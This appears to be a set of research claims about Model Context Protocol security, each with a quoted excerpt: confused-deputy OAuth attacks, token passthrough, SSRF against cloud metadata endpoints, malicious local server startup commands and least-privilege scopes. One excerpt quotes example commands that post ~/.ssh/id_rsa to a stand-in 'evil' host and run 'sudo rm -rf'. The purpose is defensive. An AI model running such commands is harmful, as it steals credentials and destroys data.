claim: MCP proxy servers using a static OAuth client ID with a third-party authorization server are vulnerable to a 'confused deputy' attack, where a leftover consent cookie plus a malicious redirect_uri from dynamic client registration lets an attacker obtain a stolen authorization code for a user's account without explicit per-client consent.
stance_target: MCP-based tool-exposure architectures require explicit per-client consent registries, not reliance on third-party authorization server consent cookies, to prevent credential theft in a software-factory tool layer
scope_conditions: MCP proxy server architecture, official MCP security spec
quoted_support: An attacker later sends the user a malicious link containing a crafted authorization request which contains a malicious redirect URI along with a new dynamically registered client ID ... The attacker exchanges the stolen authorization code for access tokens for the MCP server without the user's explicit approval

claim: MCP servers MUST NOT accept tokens that were not explicitly issued for them ('token passthrough' is explicitly forbidden); accepting and forwarding such tokens downstream bypasses audience-bound security controls and reproduces the confused-deputy problem at the downstream resource server.
stance_target: token audience validation is a mandatory security control for any MCP-based tool integration layer in an AI software factory
quoted_support: MCP servers MUST NOT accept any tokens that were not explicitly issued for the MCP server.

claim: A malicious MCP server can direct an MCP client to fetch OAuth-discovery metadata URLs pointing at cloud metadata endpoints (e.g. 169.254.169.254) to exfiltrate IAM credentials and API keys via a server-side request forgery (SSRF) attack; mitigation requires enforcing HTTPS, blocking private/link-local IP ranges per RFC 9728 Section 7.7, and routing through SSRF-preventing egress proxies.
stance_target: cloud agent sandboxes integrating MCP tools require network-level egress controls (not just application-level validation) to prevent credential exfiltration via SSRF
scope_conditions: MCP client deployments fetching OAuth metadata, official spec
quoted_support: Cloud metadata endpoints: URLs targeting http://169.254.169.254/ (AWS/GCP/Azure metadata service) can exfiltrate cloud credentials and instance information

claim: Local MCP servers configured via one-click flows can embed malicious startup commands (e.g. exfiltrating ~/.ssh/id_rsa or running rm -rf) that execute with the MCP client's full privileges; mitigation requires un-truncated command display, explicit pre-configuration consent dialogs, and sandboxed/least-privilege execution of spawned local server processes.
stance_target: local MCP server installation requires the same explicit-consent and sandboxing discipline as remote tool execution, directly relevant to the agent-sandbox/blast-radius pillar
scope_conditions: local MCP server configuration flows, official spec
quoted_support: Example malicious startup commands that could be embedded: # Data exfiltration npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location # Privilege escalation sudo rm -rf /important/system/files && echo "MCP server installed!"

claim: Publishing all possible OAuth scopes in an MCP server's scopes_supported field, or using wildcard/omnibus scopes like '*' or 'admin:*', expands the blast radius of a stolen token; the recommended mitigation is a progressive least-privilege scope model that starts with a minimal scope set and elevates incrementally via targeted WWW-Authenticate challenges only when privileged operations are first attempted.
stance_target: least-privilege, incrementally-escalated tool permission scoping is the recommended architecture for MCP-based agent tool access, directly relevant to the blast-radius-containment pillar
scope_conditions: MCP authorization scope design, official spec
quoted_support: Minimal initial scope set (e.g., mcp:tools-basic) containing only low-risk discovery/read operations ... Incremental elevation via targeted WWW-Authenticate scope="..." challenges when privileged operations are first attempted
